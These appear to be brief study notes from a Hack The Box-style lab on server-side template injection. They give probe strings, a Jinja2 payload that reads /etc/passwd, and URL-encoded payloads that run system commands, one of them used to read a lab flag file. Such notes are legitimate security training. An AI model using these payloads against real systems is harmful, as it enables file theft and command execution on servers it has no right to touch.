when we have an input field or an url using an input parameter like ?id= the nwe can test for SSTI using combinations like: 

{{7*'7'}}
${7*7}
{{7*7}}
...
...

and if they are evaluated as 49 we have an ssti
we also need to determin which sort of ssti we have

using ssti we can do a file read: 
```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

(you might need to url encode the + for the spaces)

and this can be used for command execution: 

api=http://truckapi.htb/?id%3D{{%2B['id']%2B|%2Bfilter('system')%2B}}

used this to get the flag in the skills assesment: 
api=http://truckapi.htb/?id%3D{{%2B['cat%2B%2Fflag.txt']%2B|%2Bfilter('system')%2B}}